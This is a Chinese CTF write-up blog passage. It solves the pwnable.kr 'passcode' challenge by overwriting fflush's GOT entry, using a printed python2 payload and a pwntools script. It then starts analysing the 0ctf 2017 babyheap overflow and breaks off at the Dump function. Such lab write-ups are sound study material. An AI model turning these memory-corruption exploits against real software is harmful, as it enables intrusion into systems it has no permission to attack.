<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> passcode1;</span><br><span class="line">	<span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>满足两个条件passcode1和passcode2的值为两个给定的值338150(0x528e6)和13371337(0xcc07c9),passcode1和passcode2通过scanf()输入，但是这里程序未使用&amp;来取变量地址，所以会把这两个变量的值直接作为地址来存储输入的内容，两个变量初始化时未赋值，所以值是随机的,要想利用，那么就要想办法覆盖passcode1和passcode2的值，来控制scanf()对任意地址写入数据。welcome()和login()是两个连续调用的函数，所以对于栈空间的利用是会有部分重叠的，name限定了100字节的大小，可以考虑是否可以在这100个字节内修改道passcode1和passcode2的初始值，使其变得不随机。</p>
<p><strong>下载</strong></p>
<p>第一种通过pwntools下载</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	shell.download_file(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二种通过MobaXterm连接(我所采用的)</p>
<p><strong>思路</strong></p>
<p>先看一下两个调用函数的反汇编代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048665 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x08048666 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048668 &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x0804866b &lt;+6&gt;:     sub    esp,0x10</span><br><span class="line">   0x0804866e &lt;+9&gt;:     mov    DWORD PTR [esp],0x80487f0</span><br><span class="line">   0x08048675 &lt;+16&gt;:    call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x0804867a &lt;+21&gt;:    call   0x8048609 &lt;welcome&gt;</span><br><span class="line">   0x0804867f &lt;+26&gt;:    call   0x8048564 &lt;login&gt;</span><br><span class="line">   0x08048684 &lt;+31&gt;:    mov    DWORD PTR [esp],0x8048818</span><br><span class="line">   0x0804868b &lt;+38&gt;:    call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x08048690 &lt;+43&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048695 &lt;+48&gt;:    leave  </span><br><span class="line">   0x08048696 &lt;+49&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble welcome</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x0804860c &lt;+3&gt;:     sub    esp,0x88</span><br><span class="line">   0x08048612 &lt;+9&gt;:     mov    eax,gs:0x14</span><br><span class="line">   0x08048618 &lt;+15&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861b &lt;+18&gt;:    xor    eax,eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:    mov    eax,0x80487cb</span><br><span class="line">   0x08048622 &lt;+25&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048625 &lt;+28&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:    mov    eax,0x80487dd</span><br><span class="line">   0x0804862f &lt;+38&gt;:    lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048632 &lt;+41&gt;:    mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048636 &lt;+45&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048639 &lt;+48&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:    mov    eax,0x80487e3</span><br><span class="line">   0x08048643 &lt;+58&gt;:    lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048646 &lt;+61&gt;:    mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x0804864a &lt;+65&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804864d &lt;+68&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048655 &lt;+76&gt;:    xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x0804865c &lt;+83&gt;:    je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:    call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:    leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble login</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048567 &lt;+3&gt;:     sub    esp,0x28</span><br><span class="line">   0x0804856a &lt;+6&gt;:     mov    eax,0x8048770</span><br><span class="line">   0x0804856f &lt;+11&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048572 &lt;+14&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:    mov    eax,0x8048783</span><br><span class="line">   0x0804857c &lt;+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x0804857f &lt;+27&gt;:    mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048583 &lt;+31&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048586 &lt;+34&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:    mov    eax,ds:0x804a02c</span><br><span class="line">   0x08048590 &lt;+44&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048593 &lt;+47&gt;:    call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:    mov    eax,0x8048786</span><br><span class="line">   0x0804859d &lt;+57&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485a0 &lt;+60&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:    mov    eax,0x8048783</span><br><span class="line">   0x080485aa &lt;+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080485ad &lt;+73&gt;:    mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080485b1 &lt;+77&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485b4 &lt;+80&gt;:    call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:    mov    DWORD PTR [esp],0x8048799</span><br><span class="line">   0x080485c0 &lt;+92&gt;:    call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6</span><br><span class="line">   0x080485cc &lt;+104&gt;:   jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:   cmp    DWORD PTR [ebp-0xc],0xcc07c9</span><br><span class="line">   0x080485d5 &lt;+113&gt;:   jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:   mov    DWORD PTR [esp],0x80487a5</span><br><span class="line">   0x080485de &lt;+122&gt;:   call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:   mov    DWORD PTR [esp],0x80487af</span><br><span class="line">   0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:   leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:   ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:   mov    DWORD PTR [esp],0x80487bd</span><br><span class="line">   0x080485f8 &lt;+148&gt;:   call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:   mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x08048604 &lt;+160&gt;:   call   0x8048480 &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>直接去GOT中替换程序中用到的某个函数比如fflush()，即把passcode1替换为fflush()的地址，然后在scanf(“%d”,passcode1)时输入printf(“Login OK!\n”)所在地址，然后call fflush()时就可以直接跳过验证流程cat flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ objdump -R passcode                                           </span><br><span class="line">passcode:     file format elf32-i386</span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a02c R_386_COPY        stdin@GLIBC_2.0</span><br><span class="line">0804a000 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   <span class="built_in">exit</span>@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>

<p>ssh 链接利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27;*0x60+&#x27;\x04\xa0\x04\x08&#x27;+str(0x080485d7)&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>

<p>pwntools</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	fflushAddr = <span class="number">0x0804a004</span></span><br><span class="line">	loginAddr = <span class="number">0x080485d7</span> <span class="comment">#system也可以</span></span><br><span class="line">	p = shell.process(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line">	payload=flat(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> , p32(fflushAddr),<span class="built_in">str</span>(loginAddr))</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>








]]></content>
      <categories>
        <category>娱乐项目</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆题刷题记录</title>
    <url>/2023/04/10/pwn%E5%A0%86%E9%A2%98%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="堆问题"><a href="#堆问题" class="headerlink" title="堆问题"></a>堆问题</h1><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><p>前言：buu刷题遇到到第一道堆题，是我刷题到目前为止遇到到最大的挑战，我也是看了很多wp才逐渐理解这道题的思路，希望可以慢慢前进吧</p>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><h5 id="1-chesksec查看保护机制："><a href="#1-chesksec查看保护机制：" class="headerlink" title="1.chesksec查看保护机制："></a>1.chesksec查看保护机制：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/fanfan/pwn challenges/heap/babyheap_0ctf_2017&#x27;</span>    </span><br><span class="line">Arch:     amd64-64-little     </span><br><span class="line">RELRO:    Full RELRO     </span><br><span class="line">Stack:    Canary found     </span><br><span class="line">NX:       NX enabled     </span><br><span class="line">PIE:      PIE enabled </span><br></pre></td></tr></table></figure>

<p>保护全开，那必然就要想办法泄漏出 libc 基地址的偏移量来实现调用其他函数</p>
<h5 id="2-运行程序："><a href="#2-运行程序：" class="headerlink" title="2.运行程序："></a>2.运行程序：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===== Baby Heap <span class="keyword">in</span> 2017 ===== </span><br><span class="line">1. Allocate </span><br><span class="line">2. Fill </span><br><span class="line">3. Free </span><br><span class="line">4. Dump </span><br><span class="line">5. Exit Command:</span><br></pre></td></tr></table></figure>

<p>菜单题，几个功能分别是分配、填充、释放和输出</p>
<h5 id="3-拖入-IDA-64bit-分析："><a href="#3-拖入-IDA-64bit-分析：" class="headerlink" title="3.拖入 IDA 64bit 分析："></a>3.拖入 IDA 64bit 分析：</h5><p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add((__int64)v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        free_0(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        show(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看一下sub_B70()函数（为了便于分析，我已经将其中有些匿名函数重命名了）</p>
<p><strong>sub_B70()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_B70</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *addr; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 buf[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">3</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===== Baby Heap in 2017 =====&quot;</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, buf, <span class="number">0x10</span>uLL) != <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  addr = (<span class="type">char</span> *)((buf[<span class="number">0</span>] % <span class="number">0x555555543000</span>uLL + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL);</span><br><span class="line">  v3 = (buf[<span class="number">1</span>] % <span class="number">0xE80</span>uLL) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( mmap(addr, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != addr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> &amp;addr[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个mmp函数，整个函数就是获取一块空间</p>
<blockquote>
<p>mmp函数：将硬盘上的一块区域映射为虚拟内存</p>
<p>void *mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset); 创建共享内存映射 </p>
<p>参数： </p>
<p>addr： 指定映射区的首地址。通常传NULL，表示让系统自动分配  </p>
<p>length：共享内存映射区的大小。（&lt;&#x3D; 文件的实际大小，通常为文件大小）  </p>
<p>prot： 共享内存映射区的读写属性。PROT_READ（读）、PROT_WRITE（写）、PROT_READ|PROT_WRITE（读写） </p>
<p>flags： 标注共享内存的共享属性。</p>
<p>MAP_SHARED（共享，会将映射区所做的操作反映到物理设备（磁盘）上。）  MAP_PRIVATE（私有，映射区所做的修改不会反映到物理设备。 ）  </p>
<p>fd: 用于创建共享内存映射区的那个文件的 文件描述符.</p>
<p>offset：默认0，表示映射文件全部。偏移位置。需是 4k 的整数倍。</p>
<p>返回值：  成功：映射区的首地址。</p>
<p>失败：MAP_FAILED (void(-1))， error</p>
</blockquote>
<p>接下来看一下菜单里的各个函数</p>
<p><strong>1.allocate</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">add</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> number; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )<span class="comment">//循环16次，也就是存在16块可用地址空间</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )<span class="comment">//判断该空间是否被使用</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      number = get_number();<span class="comment">//输入size大小</span></span><br><span class="line">      <span class="keyword">if</span> ( number &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( number &gt; <span class="number">4096</span> )<span class="comment">//输入的size要在0和4096之间</span></span><br><span class="line">          number = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(number, <span class="number">1uLL</span>);<span class="comment">//获得size大小的内存空间，calloc会将会将内存数据置为0</span></span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//获取失败则推出</span></span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;<span class="comment">//将该内存标记为1，即已经用了</span></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = number;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>void *calloc(size_t nitems, size_t size) 分配所需的内存空间，并返回一个指向它的指针。malloc 和 calloc 之间的不同点是，malloc 不会设置内存为零，而 calloc 会设置分配的内存为零。</p>
<p>参数</p>
<p>nitems – 要被分配的元素个数。</p>
<p>size – 元素的大小</p>
<p>返回值</p>
<p>该函数返回一个指针，指向已分配的内存。如果请求失败，则返回 NULL。</p>
</blockquote>
<p>该函数大概就是申请一块size内存，将内存信息写入，简单化一下结构图：</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-04 173941.png)</p>
<p><strong>2.FILL（存在漏洞！）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">edit</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();<span class="comment">//获取需要填充的index</span></span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )<span class="comment">//判断索引是否在范围之内</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )<span class="comment">//判断index是否已经被使用过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = get_number();<span class="comment">//获取填充字节大小</span></span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);<span class="comment">//填充指向的堆空间，大小为刚输入的大小，sub_11B2时写的一个读取函数，一个一个读取</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数大致上就是堆idx的块设置size，并填入context</p>
<p>这里就出现一个问题，在Allcate中我们输入size申请一块大小size大小的内存，但是Fill函数又让我们输入一遍size，然后读size大小的数据到该区域指向的内存空间。这存在很大问题，若我们fill输入size无限大，就可以把堆撑爆，存在漏洞！</p>
<p><strong>3.Free</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_F50</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放idx的块，将该区域使用位置为0，并将指针指为0，即指针跟着释放</p>
<p><strong>4.Dump</strong></p>
